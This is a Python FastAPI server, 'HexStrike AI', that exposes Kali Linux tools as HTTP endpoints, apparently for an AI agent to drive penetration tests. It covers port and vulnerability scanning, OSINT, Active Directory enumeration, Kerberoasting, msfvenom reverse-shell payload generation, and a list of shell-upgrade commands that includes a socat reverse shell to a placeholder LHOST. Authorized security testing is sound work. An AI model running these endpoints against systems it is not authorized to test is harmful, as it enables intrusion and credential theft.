#!/usr/bin/env python3
"""
HexStrike AI – FastAPI Tool Server
fsociety · djjessejay.ch
Port: 13145 (default)

Wraps Kali Linux security tools as HTTP endpoints.
All actions only on authorized targets.
"""

import argparse
import asyncio
import shutil
from typing import Optional

import uvicorn
from fastapi import FastAPI
from fastapi.responses import JSONResponse
from pydantic import BaseModel

app = FastAPI(title="HexStrike AI", version="1.0.0")

TOOL_TIMEOUT = 300  # seconds


# ─── helpers ────────────────────────────────────────────────────────────────

async def run_cmd(*args: str, timeout: int = TOOL_TIMEOUT) -> dict:
    """Run a subprocess and return structured output."""
    tool = args[0]
    if not shutil.which(tool):
        return {
            "error": f"tool not found: {tool}",
            "command": " ".join(args),
        }
    try:
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return {
            "stdout": stdout.decode(errors="replace"),
            "stderr": stderr.decode(errors="replace"),
            "returncode": proc.returncode,
            "command": " ".join(args),
        }
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except Exception:
            pass
        return {
            "error": f"timeout after {timeout}s",
            "command": " ".join(args),
        }
    except Exception as exc:
        return {
            "error": str(exc),
            "command": " ".join(args),
        }


# ─── request models ──────────────────────────────────────────────────────────

class PortScanRequest(BaseModel):
    target: str
    ports: str = "1-1000"
    flags: str = "-sV -sC"

class WebScanRequest(BaseModel):
    url: str
    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/common.txt"
    run_nikto: bool = True
    run_gobuster: bool = True

class VulnScanRequest(BaseModel):
    target: str
    ports: str = ""

class ExploitSuggestRequest(BaseModel):
    keyword: str

class SubdomainEnumRequest(BaseModel):
    domain: str

class OsintGatherRequest(BaseModel):
    domain: str
    sources: str = "all"

class AdEnumRequest(BaseModel):
    target: str
    username: Optional[str] = None
    password: Optional[str] = None
    domain: Optional[str] = None

class KerberoastRequest(BaseModel):
    domain: str
    username: str
    password: str
    dc_ip: Optional[str] = None

class PayloadGenRequest(BaseModel):
    payload: str = "linux/x64/shell_reverse_tcp"
    lhost: str
    lport: int = 4444
    fmt: str = "elf"

class ShellUpgradeRequest(BaseModel):
    method: str = "all"


# ─── endpoints ───────────────────────────────────────────────────────────────

@app.get("/health")
async def health():
    tools = {
        t: bool(shutil.which(t))
        for t in [
            "nmap", "nikto", "gobuster", "sqlmap", "searchsploit",
            "dnsrecon", "theharvester", "crackmapexec", "enum4linux",
            "msfvenom", "hydra", "hashcat", "masscan",
        ]
    }
    return {
        "status": "ok",
        "server": "HexStrike AI",
        "version": "1.0.0",
        "port": 13145,
        "tools_available": sum(tools.values()),
        "tools": tools,
    }


@app.post("/port_scan")
async def port_scan(req: PortScanRequest):
    """nmap port scan with service/version detection."""
    extra = req.flags.split() if req.flags else []
    args = ["nmap"] + extra + [f"-p{req.ports}", req.target]
    return await run_cmd(*args)


@app.post("/web_scan")
async def web_scan(req: WebScanRequest):
    """nikto + gobuster web application scan."""
    results = {}

    if req.run_nikto:
        results["nikto"] = await run_cmd("nikto", "-h", req.url)

    if req.run_gobuster:
        results["gobuster"] = await run_cmd(
            "gobuster", "dir",
            "-u", req.url,
            "-w", req.wordlist,
            "-q",
        )

    return results


@app.post("/vuln_scan")
async def vuln_scan(req: VulnScanRequest):
    """nmap vulnerability scripts scan."""
    args = ["nmap", "--script", "vuln"]
    if req.ports:
        args += [f"-p{req.ports}"]
    args.append(req.target)
    return await run_cmd(*args, timeout=600)


@app.post("/exploit_suggest")
async def exploit_suggest(req: ExploitSuggestRequest):
    """searchsploit / exploitdb lookup."""
    return await run_cmd("searchsploit", "--color", req.keyword)


@app.post("/subdomain_enum")
async def subdomain_enum(req: SubdomainEnumRequest):
    """dnsrecon subdomain enumeration."""
    results = {}
    results["dnsrecon"] = await run_cmd("dnsrecon", "-d", req.domain)
    if shutil.which("theharvester"):
        results["theharvester"] = await run_cmd(
            "theharvester", "-d", req.domain, "-b", "dnsdumpster,certspotter"
        )
    return results


@app.post("/osint_gather")
async def osint_gather(req: OsintGatherRequest):
    """theHarvester OSINT gathering."""
    return await run_cmd(
        "theharvester", "-d", req.domain, "-b", req.sources
    )


@app.post("/ad_enum")
async def ad_enum(req: AdEnumRequest):
    """Active Directory enumeration via crackmapexec and enum4linux."""
    results = {}

    cme_args = ["crackmapexec", "smb", req.target]
    if req.username and req.password:
        cme_args += ["-u", req.username, "-p", req.password]
    results["crackmapexec"] = await run_cmd(*cme_args)

    if shutil.which("enum4linux"):
        results["enum4linux"] = await run_cmd("enum4linux", "-a", req.target)

    return results


@app.post("/kerberoast")
async def kerberoast(req: KerberoastRequest):
    """Kerberoasting via impacket-GetUserSPNs."""
    args = [
        "impacket-GetUserSPNs",
        f"{req.domain}/{req.username}:{req.password}",
        "-request",
    ]
    if req.dc_ip:
        args += ["-dc-ip", req.dc_ip]
    return await run_cmd(*args)


@app.post("/payload_gen")
async def payload_gen(req: PayloadGenRequest):
    """msfvenom payload generation for authorized pentesting."""
    return await run_cmd(
        "msfvenom",
        "-p", req.payload,
        f"LHOST={req.lhost}",
        f"LPORT={req.lport}",
        "-f", req.fmt,
    )


@app.post("/shell_upgrade")
async def shell_upgrade(req: ShellUpgradeRequest):
    """Returns interactive shell upgrade techniques."""
    techniques = {
        "python3": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "python2": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "script": "script /dev/null -c bash",
        "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>",
        "stty": (
            "# After python pty.spawn:\n"
            "# Ctrl+Z  →  stty raw -echo; fg\n"
            "# then: export TERM=xterm; stty rows 38 cols 116"
        ),
        "rlwrap": "rlwrap nc -lvnp <PORT>",
    }
    if req.method == "all":
        return {"techniques": techniques}
    if req.method in techniques:
        return {"technique": req.method, "command": techniques[req.method]}
    return JSONResponse(status_code=404, content={"error": f"unknown method: {req.method}"})


# ─── main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="HexStrike AI Server")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=13145)
    args = parser.parse_args()
    uvicorn.run(app, host=args.host, port=args.port, log_level="info")


if __name__ == "__main__":
    main()
